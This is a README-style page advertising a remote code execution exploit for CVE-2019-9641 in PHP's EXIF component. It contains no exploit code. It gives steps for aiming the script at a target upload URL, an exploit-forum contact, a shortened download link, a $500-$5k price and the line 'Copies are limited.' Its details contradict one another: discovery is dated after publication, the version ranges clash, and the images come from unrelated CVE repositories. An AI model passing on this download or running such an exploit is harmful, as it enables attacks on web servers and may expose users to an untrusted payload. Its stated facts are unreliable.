# PHP EXIF Memory Corruption Exploit to RCE (CVE-2019-9641)

![image](https://github.com/Schnaidr/CVE-2024-2856-Stack-overflow-EXP/assets/164898121/24f9d2f3-e1e8-4993-8fb1-a4bb5526c575)

## Overview

A critical vulnerability has been discovered in PHP versions up to 7.1.26, 7.2.15, and 7.3.2, specifically affecting the `exif_process_IFD_in_TIFF` function within the EXIF component. This vulnerability, classified under CWE-119, involves memory corruption through manipulation of an unknown input, leading to unauthorized memory access.

## Details

- **CVE ID**: [CVE-2019-9641](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9641)
- **Discovered**: 03/12/2019
- **Published**: 03/09/2019
- **Actual**: Yes
- **Impact**: Confidentiality, Integrity, Availability
- **Exploitable**: Remotely, without authentication
- **Technical Details**: Known
- **Exploit Availability**: Not public

## Vulnerability Description

The vulnerability resides in the EXIF component of PHP, where the function `exif_process_IFD_in_TIFF` performs operations on a memory buffer, potentially reading from or writing to memory outside the buffer’s intended boundaries. This can lead to memory corruption, posing significant risks to the system’s confidentiality, integrity, and availability.

## Affected Versions

- PHP 7.1.0 - 7.1.27
- PHP 7.2.0 - 7.2.16
- PHP 7.3.0 - 7.3.3

## Mitigation

Upgrading to the following versions eliminates the vulnerability:
- PHP 7.1.27
- PHP 7.2.16
- PHP 7.3.3

## Exploit Details

NO PUBLIC exploit is available, but the estimated price for this PRIVATE EXPLOIT is $500-$5k.

## Detection

The commercial vulnerability scanner Qualys can detect this issue using plugin 197405, which tests for vulnerabilities in PHP 7.0 and 7.2 as reported in the Ubuntu Security Notification (USN-3922-1).

## Running

To run the exploit, replace 'https://YOUR-SITE.com/upload.php' with the actual URL of the vulnerable PHP script handling image uploads in exploit.php, then execute 
```bash
php cve-2019-9641-RCE.php
``` 
from the command line after saving the changes.

## Contact

For inquiries, please contact **schnaidr01@exploit.in**

## Exploit:
### [Download here](https://t.ly/wYBE9)

![image](https://github.com/mansploit/CVE-2024-29197-exploit/assets/164861729/0625783d-b248-42f2-84aa-17fba6d9dbc7)


![image](https://github.com/mansploit/CVE-2024-29197-exploit/assets/164861729/e3175170-04da-4b3e-9331-ba3d71b17dbe)

Copies are limited.</br>
For education purposes only.
